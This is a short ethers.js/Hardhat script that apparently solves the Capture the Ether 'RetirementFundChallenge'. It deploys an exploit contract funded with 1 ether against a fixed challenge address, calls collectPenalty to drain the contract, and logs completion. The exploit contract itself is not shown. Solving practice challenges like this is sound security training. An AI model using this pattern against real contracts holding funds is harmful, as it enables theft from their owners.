async function main() {
    Challenge = await ethers.getContractFactory('RetirementFundChallenge');
    challenge = await Challenge.attach('0x924Cf20634684550eaD179a6AbdB3627d0d533c4');

    Exploit = await ethers.getContractFactory('RetirementFundExploit');
    exploit = await Exploit.deploy(challenge.address, {value: ethers.utils.parseEther('1')});
    await exploit.deployed();

    tx = await challenge.collectPenalty();
    await tx.wait();
    console.log('Challenge completed:', await challenge.isComplete());
}
main()
  .then(() => process.exit(0))
  .catch((error) => {
      console.error(error.message);
      process.exit(1);
  })